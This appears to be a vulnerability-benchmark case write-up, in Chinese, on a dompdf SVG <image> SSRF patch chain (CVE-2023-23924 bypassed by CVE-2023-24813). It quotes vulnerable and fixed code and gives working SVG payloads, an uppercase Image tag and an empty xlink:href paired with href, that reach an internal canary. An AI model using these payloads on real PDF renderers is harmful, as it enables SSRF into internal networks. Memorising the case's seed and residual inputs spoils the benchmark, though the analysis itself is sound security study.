# dompdf SVG 内嵌 image：标签大小写改完了，空的 xlink:href 仍能瞎掉校验

- Case：`PCBV2-0104`（`dompdf-cve-2023-24813`）
- 产品：Dompdf（`dompdf/dompdf`）+ `phenx/php-svg-lib`。HTML 里的 SVG `<image>` 在转 PDF 时要取 href 指向的图。
- 链：CVE-2023-23924（2.0.1 → 2.0.2，commit `7558f07`，GHSA-3cw5-7cxw-v5qg）→ CVE-2023-24813（2.0.2 → 2.0.3，commit `95009ea`，GHSA-56gj-mvh6-rp75）
- 源码对着 GitHub tag `v2.0.2` / `v2.0.3` 的 `src/Image/Cache.php::resolve_url`，以及 php-svg-lib `0.5.4` 的 `Svg/Tag/Image.php::start`。运行时装的是 composer 整包。

2023 年 1 月，dompdf 2.0.2 把 SVG 内层 `<image>` 的名字比较改成 `strtolower($name) === "image"`。这挡住了 `<Image>` 这种大小写绕过：2.0.1 的 XML 解析器关了 case folding，`$name === "image"` 对大写 I 为假，校验整段跳过，php-svg-lib 仍会去 fetch href。三周后 GHSA-56gj-mvh6-rp75 标题就是 *Bypass of CVE-2023-23924*：dompdf 用 `$attributes["xlink:href"] ?? $attributes["href"]` 只校验一个 URL；php-svg-lib 两个属性都读，且 **href 后写覆盖**。空的 `xlink:href=""` 让 PHP `??` 不回落到 `href`，`!empty("")` 为假，校验跳过，真正的 `href` 仍被 svg-lib 取走。

根因不只是「少校验了一个属性」。检查插在「dompdf 自己的 XML 回调里选出的那一个 URL」这一层；真正发 HTTP 的是 php-svg-lib 的 `drawImage($this->href)`。两个解析器对同一对属性的优先级不同。下面按 POST /render 走进去、2.0.2 改了哪一行、`??` 之后谁消费那个 href、双边校验有没有挂上，把这几层写完。

---

## 这块功能本来在干什么

Dompdf 把 HTML 画成 PDF。`<img src="...">` 以及 SVG 里的 `<image>` 都要经过 `Image\Cache::resolve_url`：按 `Options` 的 allowed protocols 决定能不能取这份资源。默认 `isRemoteEnabled=false` 时，`http://` 不在允许列表。

外层 SVG 常常以 `data:image/svg+xml;base64,...` 进来，data URI 不走远程协议检查。危险发生在 **SVG 内部再引用一张图**：内层 href 可以是 `http://` / `phar://`。2.0.1 起，`resolve_url` 在认出 SVG 之后用 `xml_parser` 扫一遍内层 `image`，对每个 href 递归调用自己做协议检查。

本 case：`POST /render` 把攻击者 HTML 交给真实 `Dompdf->loadHtml()+render()`。内层 href 指向 compose 网络里、不映射宿主机端口的 canary：`http://canary:9000/${PCB_FLAG}`。canary 记下路径并返回 token。能打到 canary 就是 SSRF。

数据流：

```text
HTTP POST /render  HTML
    → <img src="data:image/svg+xml;base64,SVG">
    → Cache::resolve_url(外层 data URI)     ← data: 放行
         type===svg
         xml_parser (CASE_FOLDING=false)
              V0：if ($name === "image")
              V1：if (strtolower($name) === "image")   ← 补丁只改这一行
                   $url = xlink:href ?? href
                   if (!empty($url)) resolve_url($url)  ← 协议白名单
         然后把本地临时 SVG 交给 php-svg-lib
              Image::start
                   先读 xlink:href，再读 href（后者覆盖）
                   drawImage($this->href)               ← 真正的 fetch
    → canary 被命中 → canary_hits 含 FLAG
```

没有登录。`isRemoteEnabled` 默认关着；外层 data URI 不需要它，内层 http 才需要骗过校验。

---

## 原始漏洞：大小写敏感的标签名（CVE-2023-23924，2.0.1）

2.0.1：

```php
xml_parser_set_option($parser, XML_OPTION_CASE_FOLDING, false);
...
if ($name === "image") {
    $attributes = array_change_key_case($attributes, CASE_LOWER);
    $url = $attributes["xlink:href"] ?? $attributes["href"];
    ...
}
```

属性名被 lower；**元素名没有**。`<Image xlink:href="http://...">` 的 `$name` 是 `Image`，整段校验不进。php-svg-lib 不在乎大小写，照样 fetch。NVD / GHSA-3cw5-7cxw-v5qg：*The URI validation on dompdf 2.0.1 can be bypassed on SVG parsing by passing `<image>` tags with uppercase letters.* PHP < 8 上 `phar://` 还能接到 unserialize。

本 case seed：

```xml
<Image xlink:href="http://canary:9000/<FLAG>"/>
```

2.0.1 上 canary 被命中。这就是 v0 + `--seed` 退出码 0。

---

## 维护者改了什么（CVE-2023-23924 修复，2.0.2）

commit `7558f07` 只改比较。tag `v2.0.2`：

```php
# src/Image/Cache.php :: resolve_url  (v2.0.2)
                    function ($parser, $name, $attributes) use ($options, $parsed_url, $full_url) {
                        if (strtolower($name) === "image") {
                            $attributes = array_change_key_case($attributes, CASE_LOWER);
                            $url = $attributes["xlink:href"] ?? $attributes["href"];
                            if (!empty($url)) {
                                $inner_full_url = Helpers::build_url(...);
                                if ($inner_full_url === $full_url) {
                                    throw new ImageException("SVG self-reference is not allowed", E_WARNING);
                                }
                                [$resolved_url, $type, $message] = self::resolve_url($url, ...);
                                if (!empty($message)) {
                                    throw new ImageException("This SVG document references a restricted resource. $message", E_WARNING);
                                }
                            }
                        }
                    },
```

字面意思：

| 片段 | 含义 |
|---|---|
| `strtolower($name) === "image"` | 大写 `<Image>` 也会进校验 |
| `$attributes["xlink:href"] ?? $attributes["href"]` | 只选出**一个** URL；左边存在（含空串）就不看右边 |
| `if (!empty($url))` | 空串、null、未设置都不校验 |

对 seed 这种大写标签 + 非空 `xlink:href=http://...`，它确实够用：进入分支，`??` 取到 http URL，`resolve_url` 因协议不允许抛错，外层 SVG 变成 broken-image，php-svg-lib 拿不到那次 fetch。这就是 v1 + `--seed` 退出码 10。

补丁默认了两件事：

1. 只要标签名对了，取出的那一个 href 就是 svg-lib 会去取的那个。
2. `??` 在「没有 xlink:href」时才会落到 href。

第二点对 PHP 不成立：`??` 只在 **null / 未定义** 时回落。空字符串是已定义的非 null。`xlink:href=""` 让 `$url=""`，`!empty` 为假，递归校验整段不跑。

第一点也不成立：php-svg-lib 的优先级与 dompdf 相反。

---

## 检查之后，谁真正消费那个值

dompdf 的回调只决定「要不要对某个 URL 再跑一遍 `resolve_url`」。扫完 XML 之后，同一份临时 SVG 文件交给 php-svg-lib。`Svg\Tag\Image::start`（0.5.4）：

```php
# php-svg-lib 0.5.4 :: Svg/Tag/Image.php :: start
        if (isset($attributes['xlink:href'])) {
            $this->href = $attributes['xlink:href'];
        }

        if (isset($attributes['href'])) {
            $this->href = $attributes['href'];
        }
        ...
        $this->document->getSurface()->drawImage($this->href, $this->x, $this->y, $this->width, $this->height);
```

两个属性都存在时，**href 赢**。空的 xlink:href 仍 `isset` 为真，先赋成 `""`，再被非空 `href` 覆盖。`drawImage` 去取的是 canary URL。

过滤器刚看过的是 `$url=""`（跳过）；消费者看到的是 `href="http://canary:9000/FLAG"`。GHSA-56gj-mvh6-rp75 原话：*Due to the difference in the attribute parser of Dompdf and php-svg-lib*。

---

## 仓库里已经有更强的检查，2.0.2 没用

同一回调里已经会对选出的 URL 做完整的协议/规则检查（递归 `resolve_url`）。缺的是「两个属性都要检查」。把 `??` 换成对两个键各跑一次即可。

2.0.3 / commit `95009ea` 独立校验 `xlink:href` 和 `href`。空的 xlink 不再能遮住非空 href。V1 没有这段。php-svg-lib 自己对 `phar://` 有一层拒绝，但 `http://` 在 `allowExternalReferences` 为真或默认路径下仍会 fetch；dompdf 这边的协议白名单才是本 case 的门。V1 把门挂在「选错了的那一个属性」上。

---

## 这个补丁挡住了什么、没挡住什么

到这里可以把「过滤器 vs fetch」落到具体代码：

- `strtolower($name)==="image"`：看标签名
- `$a["xlink:href"] ?? $a["href"]` + `!empty`：看左边那个值是不是非空
- php-svg-lib：先 xlink 再 href，后者覆盖

seed：

```text
<Image xlink:href="http://canary/...">
    strtolower → 进分支
    ?? → 非空 http URL
    resolve_url 拒绝 http → 挡
```

residual：

```text
<image xlink:href="" href="http://canary:9000/FLAG">
    strtolower → 进分支
    ?? → ""（空串不是 null）
    !empty("") → false → 不递归
    svg-lib href 覆盖 → drawImage(http://canary/...) → 金丝雀
```

变换是：标签改回小写（现在必须进分支），加上**设置了但为空**的 `xlink:href`，把真正的目标放到 `href`。V1 拦的是「大写标签跳过整个 if」；它假设「进了 if 之后取出的 URL 就是会 fetch 的 URL」。`??` 和 svg-lib 的覆盖顺序让这个假设为假。

外层 HTML 仍是：

```html
<img src="data:image/svg+xml;base64,<SVG>"/>
```

data URI 让外层 `resolve_url` 不查 http。canary 只应被内层 `<image href>` 打到。V1 上 seed 的大写标签被 `strtolower` 抓住，所以 canary 安静；residual 的空 xlink 让回调提前 return，canary 才响。

---

## 残余仍然走同一条 SVG 内层 image 取图路径（CVE-2023-24813）

没有换 `resolve_url`、没有换 data URI 外层、没有换 canary。还是 POST /render 里嵌一套 SVG `<image>`。只是绕过手法从「标签大小写」换成「空 xlink:href 盲掉 ??」：

```xml
<image xlink:href="" href="http://canary:9000/<FLAG>"/>
```

V1 的 `strtolower` 让这个小写标签进入校验；`??` 选出空串；校验跳过；svg-lib fetch href。

本 case `verify.sh` residual 与 heldout 同一 SVG。平台 residual 与源码链是**同一 sink**（内层 image 的 URI 门 + svg-lib fetch）。认证：v1 + `--residual` 退出码 0。

所以残余不是新洞面，而是同一校验回调上三件事叠在一起：只读一个属性；`??` 把空串当「已有值」；下游解析器后写的 href 才是真实目标。seed 被挡住只说明「大写标签也会进 if」，不说明「不能再让 svg-lib 去打内部 HTTP」。

---

## 后来又补了什么（CVE-2023-24813，2.0.3）

`95009ea` / 2.0.3 对 `xlink:href` 和 `href` 分别在非空时调用 `resolve_url`。非空 `href=http://canary` 被协议检查拦住，即使 xlink 为空。

对残余输入：内层 http 被拒，canary 无命中。seed 的大写标签仍被 `strtolower` 送进同一套双边检查。公开建议升级到 2.0.3。NVD：*This vulnerability has been addressed in commit `95009ea98` which has been included in release version 2.0.3.*

即便如此，这仍然依赖「dompdf 扫一遍」和「svg-lib 再 parse 一遍」保持属性集合一致。其它只被一方看见的属性/命名空间写法，需要另证。本 benchmark 的 v2 只关闭空 xlink + href 这条 reference residual。

---

## 从这条链还能看出什么

这些不是分类标签，只是顺着代码继续看时比较自然的问题。

**维护者改错了哪一层。**  
他们改的是元素名比较。真正发请求的是 php-svg-lib 对 href 的读取顺序。V2 仍在 dompdf 回调里加码，但覆盖了两个属性。

**不是没有更好的谓词。**  
递归 `resolve_url` 已经是完整的协议门。把它应用到 svg-lib 会用到的每一个 URL 即可。从 V1 的 diff 只能看到 `strtolower`；要判断闭合，必须看到 `??` 和 `Image.php` 里后写覆盖。

**同一 resolve_url 回调、同一张 SVG，只换了属性怎么填。**  
任何内层 `<image>` 在 2.0.2 上都吃这一对 `??` / svg-lib。advisory 的 PoC 就是空 xlink + href。

**两个解析器必须对「哪个属性算 URI」达成一致。**  
校验器尊重 xlink 优先；消费者尊重 href 优先。空值让 PHP 的 `??` 站在校验器一边，却帮不了消费者。

**canary 在内部网络且无宿主机端口是有意的。**  
打到它只能是 PDF 渲染进程自己发出的 HTTP，不是扫描器直连。

**`??` 不是「没有 href 就用另一个」。**  
PHP 文档：`isset` 对空串为真，`??` 只跳过 null。HTML/SVG 里写 `xlink:href=""` 是合法属性，解析器会给出空字符串而不是省略该键。校验器把「空」理解成「没什么要检查的」；消费者把「空 xlink + 有 href」理解成「用 href」。同一份属性表，两种空值语义。

**外层 data URI 不是第二条 sink。**  
seed 和 residual 都把 SVG 放进 `data:image/svg+xml;base64`，好让外层不触发 `isRemoteEnabled`。效果通道始终是内层 `image` 的 fetch。平台 residual 没有改成「去打另一张图的 URL」，仍是 Cache.php 回调 + php-svg-lib Image::start。

---

## 版本、入口、参考

| | dompdf | 内层 image 门 | `<Image>` seed | 空 xlink + href residual |
|---|---|---|---|---|
| V0 | 2.0.1 | `$name === "image"` | SSRF，打到 canary | （不必） |
| V1 | 2.0.2 | `strtolower`；`??` 只选一个 URL | 进校验，挡 | `??` 得空串，svg-lib fetch href |
| V2 | 2.0.3 | 两个属性各自 `resolve_url` | 挡 | href 被拦，挡 |

- Web：`POST /render`（真实 Dompdf loadHtml/render）
- 认证：v0 seed 观察到 flag；v1 seed 未观察到；v1 residual 观察到
- [CVE-2023-23924](https://nvd.nist.gov/vuln/detail/CVE-2023-23924)、[CVE-2023-24813](https://nvd.nist.gov/vuln/detail/CVE-2023-24813)
- [GHSA-3cw5-7cxw-v5qg](https://github.com/dompdf/dompdf/security/advisories/GHSA-3cw5-7cxw-v5qg)、[GHSA-56gj-mvh6-rp75](https://github.com/dompdf/dompdf/security/advisories/GHSA-56gj-mvh6-rp75)
- V1 源码：[Cache.php @ v2.0.2](https://github.com/dompdf/dompdf/blob/v2.0.2/src/Image/Cache.php)
- 消费者：[Image.php @ php-svg-lib 0.5.4](https://github.com/dompdf/php-svg-lib/blob/0.5.4/src/Svg/Tag/Image.php)
- V1 commit `7558f07`；V2 commit `95009ea`
